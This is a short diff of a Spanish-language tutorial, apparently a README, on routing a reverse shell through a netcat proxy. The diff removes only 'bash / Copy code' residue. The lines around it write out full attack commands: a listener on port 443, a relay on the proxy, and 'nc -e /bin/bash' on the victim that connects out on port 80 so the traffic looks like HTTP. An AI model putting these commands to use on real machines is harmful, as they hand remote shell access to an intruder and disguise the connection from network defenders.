@@ -13,22 +13,16 @@ En este escenario, hemos configurado una conexión de shell inversa a través de
 Máquina Atacante (Attacker)
 Ejecutar el siguiente comando para escuchar la conexión entrante:
 
-bash
-Copy code
 nc -lvp 443
 
 # Proxy
 Ejecutar el siguiente comando para redirigir el tráfico entrante al puerto 443 de la máquina atacante:
 
-bash
-Copy code
 nc -lvp 443 | nc [IP de la máquina atacante] 443
 
 # Máquina Víctima (Victim)
 Ejecutar el siguiente comando para enviar una shell inversa al proxy en el puerto 80 (simulando una conexión HTTP):
 
-bash
-Copy code
 nc -e /bin/bash [IP del proxy] 80
 
 # Consideraciones Importantes
